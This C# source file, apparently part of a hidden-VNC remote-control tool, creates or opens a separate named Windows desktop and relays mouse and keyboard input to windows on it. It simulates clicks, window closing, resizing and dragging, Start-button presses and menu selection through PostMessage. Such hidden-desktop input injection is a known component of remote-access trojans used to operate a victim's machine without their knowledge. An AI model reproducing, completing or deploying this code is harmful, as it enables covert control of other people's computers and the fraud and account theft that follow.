using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Hidden_handler
{
    public class input_handler
    {

        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE = 0,
            DESKTOP_READOBJECTS = 0x0001,
            DESKTOP_CREATEWINDOW = 0x0002,
            DESKTOP_CREATEMENU = 0x0004,
            DESKTOP_HOOKCONTROL = 0x0008,
            DESKTOP_JOURNALRECORD = 0x0010,
            DESKTOP_JOURNALPLAYBACK = 0x0020,
            DESKTOP_ENUMERATE = 0x0040,
            DESKTOP_WRITEOBJECTS = 0x0080,
            DESKTOP_SWITCHDESKTOP = 0x0100,
            GENERIC_ALL = (uint)(DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                            DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                            DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP),
        }
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice,
            IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll")]
        public static extern IntPtr WindowFromPoint(POINT point);

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr PostMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        public static extern bool ScreenToClient(IntPtr hWnd, ref POINT lpPoint);

        [DllImport("user32.dll")]
        public static extern IntPtr ChildWindowFromPoint(IntPtr hWnd, POINT point);

        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        public static extern bool PtInRect(ref RECT lprc, POINT pt);

        [DllImport("user32.dll")]
        public static extern bool SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll")]
        public static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        public static extern bool GetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        public static extern int MenuItemFromPoint(IntPtr hWnd, IntPtr hMenu, POINT pt);

        [DllImport("user32.dll")]
        public static extern int GetMenuItemID(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        public static extern IntPtr GetSubMenu(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        public static extern bool MoveWindow(IntPtr hWnd, int x, int y, int width, int height, bool repaint);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int RealGetWindowClass(IntPtr hwnd, [Out] StringBuilder pszType, int cchType);


        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int x;
            public int y;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WINDOWPLACEMENT
        {
            public int length;
            public int flags;
            public int showCmd;
            public POINT ptMinPosition;
            public POINT ptMaxPosition;
            public RECT rcNormalPosition;
        }


        private const int GWL_STYLE = -16;
        private const int WS_DISABLED = 0x8000000;

        private const int WM_CHAR = 0x0102;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_LBUTTONUP = 0x0202;
        private const int WM_LBUTTONDOWN = 0x0201;
        private const int WM_MOUSEMOVE = 0x0200;
        private const int WM_CLOSE = 0x0010;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int SC_MINIMIZE = 0xF020;
        private const int SC_RESTORE = 0xF120;
        private const int SC_MAXIMIZE = 0xF030;
        private const int HTCAPTION = 2;
        private const int HTTOP = 12;
        private const int HTBOTTOM = 15;
        private const int HTLEFT = 10;
        private const int HTRIGHT = 11;
        private const int HTTOPLEFT = 13;
        private const int HTTOPRIGHT = 14;
        private const int HTBOTTOMLEFT = 16;
        private const int HTBOTTOMRIGHT = 17;
        private const int HTCLOSE = 20;
        private const int HTMINBUTTON = 8;
        private const int HTMAXBUTTON = 9;
        private const int HTTRANSPARENT = -1;
        private const int VK_RETURN = 0x0D;
        private const int MN_GETHMENU = 0x01E1;
        private const int BM_CLICK = 0x00F5;

        private const int MAX_PATH = 260;
        private const int WM_NCHITTEST = 0x0084;
        private const int SW_SHOWMAXIMIZED = 3;
        private POINT lastPoint = new POINT() {x=0,y=0};
        private IntPtr hResMoveWindow = IntPtr.Zero;
        private IntPtr resMoveType = IntPtr.Zero;
        private bool lmouseDown = false;

        private static object lockObject = new object();

        string DesktopName = null;
        public IntPtr Desktop = IntPtr.Zero;
        public input_handler(string DesktopName)
        {
            this.DesktopName = DesktopName;
            IntPtr Desk = OpenDesktop(DesktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
            if (Desk == IntPtr.Zero)
            {
                Desk = CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            }
            Desktop = Desk;
        }
        public void Dispose() 
        {
            CloseDesktop(Desktop);
            GC.Collect();
        }
        public static int GET_X_LPARAM(IntPtr lParam)
        {
            return (short)(lParam.ToInt32() & 0xFFFF);
        }
        public static int GET_Y_LPARAM(IntPtr lParam)
        {
            return (short)((lParam.ToInt32() >> 16) & 0xFFFF);
        }

        public static IntPtr MAKELPARAM(int lowWord, int highWord)
        {
            int lParam = (highWord << 16) | (lowWord & 0xFFFF);
            return new IntPtr(lParam);
        }

        public void Input(uint msg, IntPtr wParam, IntPtr lParam)
        {
            lock (lockObject) 
            { 
                SetThreadDesktop(Desktop);
                IntPtr hWnd = IntPtr.Zero;
                POINT point;
                POINT lastPointCopy;
                bool mouseMsg = false;
                switch (msg)
                {
                    case WM_CHAR:
                    case WM_KEYDOWN:
                    case WM_KEYUP:
                        {
                            point = lastPoint;
                            hWnd = WindowFromPoint(point);
                            break;
                        }
                    default:
                        {
                            mouseMsg = true;
                            point.x = GET_X_LPARAM(lParam);
                            point.y = GET_Y_LPARAM(lParam);
                            lastPointCopy = lastPoint;
                            lastPoint = point;
                            hWnd = WindowFromPoint(point);
                            if (msg == WM_LBUTTONUP)
                            {
                                lmouseDown = false;
                                IntPtr lResult = SendMessage(hWnd, WM_NCHITTEST, IntPtr.Zero, lParam);

                                switch (lResult.ToInt32())
                                {
                                    case HTTRANSPARENT:
                                        {
                                            SetWindowLong(hWnd, GWL_STYLE, GetWindowLong(hWnd, GWL_STYLE) | WS_DISABLED);
                                            lResult = SendMessage(hWnd, WM_NCHITTEST, IntPtr.Zero, lParam);
                                            break;
                                        }
                                    case HTCLOSE:
                                        {
                                            PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                                            break;
                                        }
                                    case HTMINBUTTON:
                                        {
                                            PostMessage(hWnd, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
                                            break;
                                        }
                                    case HTMAXBUTTON:
                                        {
                                            WINDOWPLACEMENT windowPlacement = new WINDOWPLACEMENT();
                                            windowPlacement.length = Marshal.SizeOf(windowPlacement);
                                            GetWindowPlacement(hWnd, ref windowPlacement);
                                            if ((windowPlacement.flags & SW_SHOWMAXIMIZED) != 0)
                                                PostMessage(hWnd, WM_SYSCOMMAND, new IntPtr(SC_RESTORE), IntPtr.Zero);
                                            else
                                                PostMessage(hWnd, WM_SYSCOMMAND, new IntPtr(SC_MAXIMIZE), IntPtr.Zero);
                                            break;
                                        }
                                }
                                break;
                            }
                            else if (msg == WM_LBUTTONDOWN)
                            {
                                lmouseDown = true;
                                hResMoveWindow = IntPtr.Zero;

                                RECT startButtonRect;
                                IntPtr hStartButton = FindWindow("Button", null);
                                GetWindowRect(hStartButton, out startButtonRect);
                                if (PtInRect(ref startButtonRect, point))
                                {
                                    PostMessage(hStartButton, BM_CLICK, IntPtr.Zero, IntPtr.Zero);
                                    return;
                                }
                                else
                                {
                                    StringBuilder windowClass = new StringBuilder(MAX_PATH);
                                    RealGetWindowClass(hWnd, windowClass, MAX_PATH);

                                    if (windowClass.ToString() == "#32768")
                                    {
                                        IntPtr hMenu = GetSubMenu(hWnd, 0);
                                        int itemPos = MenuItemFromPoint(IntPtr.Zero, hMenu, point);
                                        int itemId = GetMenuItemID(hMenu, itemPos);
                                        PostMessage(hWnd, 0x1E5, new IntPtr(itemPos), IntPtr.Zero);
                                        PostMessage(hWnd, WM_KEYDOWN, new IntPtr(VK_RETURN), IntPtr.Zero);
                                        return;
                                    }
                                }
                            }
                            else if (msg == WM_MOUSEMOVE)
                            {
                                if (!lmouseDown)
                                    break;

                                if (hResMoveWindow == IntPtr.Zero)
                                    resMoveType = SendMessage(hWnd, WM_NCHITTEST, IntPtr.Zero, lParam);
                                else 
                                {
                                    hWnd = hResMoveWindow;
                                }
                                
                                int moveX = lastPointCopy.x - point.x;
                                int moveY = lastPointCopy.y - point.y;

                                RECT rect;
                                GetWindowRect(hWnd, out rect);

                                int x = rect.left;
                                int y = rect.top;
                                int width = rect.right - rect.left;
                                int height = rect.bottom - rect.top;
                                switch (resMoveType.ToInt32())
                                {
                                    case HTCAPTION:
                                        {
                                            x -= moveX;
                                            y -= moveY;
                                            break;
                                        }
                                    case HTTOP:
                                        {
                                            y -= moveY;
                                            height += moveY;
                                            break;
                                        }
                                    case HTBOTTOM:
                                        {
                                            height -= moveY;
                                            break;
                                        }
                                    case HTLEFT:
                                        {
                                            x -= moveX;
                                            width += moveX;
                                            break;
                                        }
                                    case HTRIGHT:
                                        {
                                            width -= moveX;
                                            break;
                                        }
                                    case HTTOPLEFT:
                                        {
                                            y -= moveY;
                                            height += moveY;
                                            x -= moveX;
                                            width += moveX;
                                            break;
                                        }
                                    case HTTOPRIGHT:
                                        {
                                            y -= moveY;
                                            height += moveY;
                                            width -= moveX;
                                            break;
                                        }
                                    case HTBOTTOMLEFT:
                                        {
                                            height -= moveY;
                                            x -= moveX;
                                            width += moveX;
                                            break;
                                        }
                                    case HTBOTTOMRIGHT:
                                        {
                                            height -= moveY;
                                            width -= moveX;
                                            break;
                                        }
                                    default:
                                        return;
                                }
                                MoveWindow(hWnd, x, y, width, height, false);
                                hResMoveWindow = hWnd;
                                return;
                            }
                            break;
                        }
                }

                for (IntPtr currHwnd = hWnd; ;)
                {
                    hWnd = currHwnd;
                    ScreenToClient(hWnd, ref point);
                    currHwnd = ChildWindowFromPoint(hWnd, point);
                    if (currHwnd == IntPtr.Zero || currHwnd == hWnd)
                        break;
                }

                if (mouseMsg)
                {
                    lParam = MAKELPARAM(point.x, point.y);
                }
                PostMessage(hWnd, msg, wParam, lParam);
            }
        }
    }
}
